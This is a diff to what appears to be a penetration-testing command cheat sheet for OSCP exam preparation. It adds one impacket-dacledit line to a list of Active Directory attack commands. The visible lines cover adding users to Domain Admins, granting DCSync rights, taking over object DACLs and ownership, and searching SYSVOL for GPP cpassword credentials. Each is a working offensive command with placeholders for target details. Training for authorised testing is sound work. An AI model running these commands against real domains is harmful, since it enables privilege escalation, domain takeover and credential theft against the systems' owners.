@@ -322,6 +322,7 @@ ACL Abuse:Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> # Add 
 ACL Abuse:Add-ObjectACL -TargetDistinguishedName "DC=<domain>,DC=<tld>" -PrincipalSamAccountName <user> -Rights DCSync # Grant DCSync rights; target-machine
 ACL Abuse:impacket-dacledit '<domain>/<user>:<password>' -dc-ip <dc-ip> -target '<user>' -action write -rights FullControl #grant FullControl over target AD user when WriteDACL is available; kali-machine
 ACL Abuse:impacket-dacledit '<domain>/<user>@<dc-ip>' -hashes :<ntlm> -dc-ip <dc-ip> -target '<user>' -action write -rights FullControl #grant FullControl over target AD object using NTLM hash authentication; kali-machine
+ACL Abuse:impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target-dn '<target-dn>' '<domain>/<user>:<password>' -dc-ip <dc-ip> #grant FullControl over target AD object DACL to specified principal for ACL-based abuse paths; target DN example: CN=HelpDesk Users,CN=Users,DC=oscp,DC=exam; kali-machine
 ACL Abuse:impacket-owneredit '<domain>/<user>:<password>' -dc-ip <dc-ip> -target '<user>' -action write -new-owner <user> #take ownership of target AD object before modifying its ACL; kali-machine
 GPP/cPassword:findstr /spin /i "password cpassword" \\%USERDNSDOMAIN%\SYSVOL\%USERDNSDOMAIN%\Policies\* 2>nul #search SYSVOL policies for passwords and legacy GPP cpassword artifacts from Windows shell; target-machine
 GPP/cPassword:nxc smb <target> -u '<user>' -p '<password>' -M gpp_password # Find GPP passwords; kali-machine
